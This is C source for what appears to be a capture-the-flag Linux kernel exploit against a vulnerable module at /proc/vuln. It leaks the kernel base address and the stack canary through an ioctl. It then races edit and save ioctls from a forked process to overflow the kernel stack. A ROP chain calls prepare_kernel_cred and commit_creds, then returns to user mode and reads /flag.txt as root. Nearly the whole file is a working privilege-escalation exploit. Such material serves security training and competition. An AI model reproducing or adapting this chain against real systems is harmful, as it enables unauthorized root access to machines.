#include <stdio.h>
#include <fcntl.h>
#include <sys/param.h>
#define __USE_MISC
#include <sys/mman.h>
#include <sys/stat.h>
#include <string.h>
// #include <linux/sched/types.h>
#include <sys/ioctl.h>

#define SET_MAX 0x10
#define EDIT_STORAGE 0x20
#define SAVE_STORAGE 0x30
#define READ_STORAGE 0x40

unsigned long *global;

typedef struct data
{
    char *content;
    size_t length;
} data;

int mod_fd;

void hexdump(char *addr, size_t size)
{
    for (size_t i = 0; i < size; i += 8)
    {
        printf("%#02llx: %#018llx\n", i, *(unsigned long *)(addr + i));
    }
}

void init()
{
    mod_fd = open("/proc/vuln", O_RDWR, 0);
}

void get_shell();
unsigned long saved_eflags;
unsigned int saved_ss;
unsigned long saved_rsp;
unsigned int saved_cs;
void* saved_rip = get_shell;
void save()
{
    __asm__(
        ".intel_syntax noprefix;"

        "mov saved_ss, ss;"
        "mov saved_cs, cs;"
        "mov saved_rsp, rsp;"
        "pushf;"
        "pop saved_eflags;"

        ".att_syntax;"
    );
}

void get_shell()
{
    // execve("/bin/sh", 0, 0);
    int fd = open("/flag.txt", O_RDONLY, 0);
    char buffer[0x40] = {};
    read(fd, buffer, sizeof(buffer)-1);
    printf("%d %s\n", geteuid(), buffer);
    exit(0);
}

int main()
{
    global = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    global[0] = (char *)global + 0x800;

    init();
    save();

    data storage = {};

    unsigned long buffer[0xf0 / 8] = {};
    memset(buffer, sizeof(buffer), 0);
    unsigned long max = sizeof(buffer);

    // hexdump(buffer, sizeof(buffer));

    ioctl(mod_fd, SET_MAX, 0x1000);

    buffer[0] = 0xf0;
    ioctl(mod_fd, READ_STORAGE, buffer);

    char *kernel_base = buffer[17] - 0x1e078c;
    printf("kernel: %p\n", kernel_base);
    unsigned long canary = buffer[10];
    printf("canary: %p\n", canary);

    hexdump(buffer, 0xf0);

    char* pop_rax = kernel_base + 0xdc0e;
    char* pop_rdi = kernel_base + 0x2c3a;
    char* prepare_kernel_cred = kernel_base + 0x895e0;
    char* commit_creds = kernel_base + 0x892c0;
    char* ret2usr = kernel_base + 0xc00a2f + 22;

    ((unsigned long *)global[0])[30] = canary;
    ((unsigned long *)global[0])[31] = canary;

    int offset = 34;
    ((unsigned long *)global[0])[offset++] = pop_rdi;
    ((unsigned long *)global[0])[offset++] = 0;
    ((unsigned long *)global[0])[offset++] = pop_rax;
    ((unsigned long *)global[0])[offset++] = 0;
    
    ((unsigned long *)global[0])[offset++] = prepare_kernel_cred;
    
    ((unsigned long *)global[0])[offset++] = commit_creds;

    ((unsigned long *)global[0])[offset++] = ret2usr;
    ((unsigned long *)global[0])[offset++] = 0;
    ((unsigned long *)global[0])[offset++] = 0;
    ((unsigned long *)global[0])[offset++] = saved_rip;
    ((unsigned long *)global[0])[offset++] = saved_cs;
    ((unsigned long *)global[0])[offset++] = saved_eflags;
    ((unsigned long *)global[0])[offset++] = saved_rsp;
    ((unsigned long *)global[0])[offset++] = saved_ss;

    global[1] = 0x200;

    getchar();

    if (fork())
    {
        while (1)
        {
            ioctl(mod_fd, EDIT_STORAGE, global);

            ioctl(mod_fd, SAVE_STORAGE, NULL);
        }
    }
    else
    {
        while (1)
        {
            *(char *)(global[0]) == 'A';
            global[1] = 0x10;
            write(1, global[0], 1);
            *(char *)(global[0]) == 'B';
            global[1] = 0x200;
            write(1, global[0], 1);
        }
    }

    puts("end");
    exit(-1);
}

// 0x19a3d7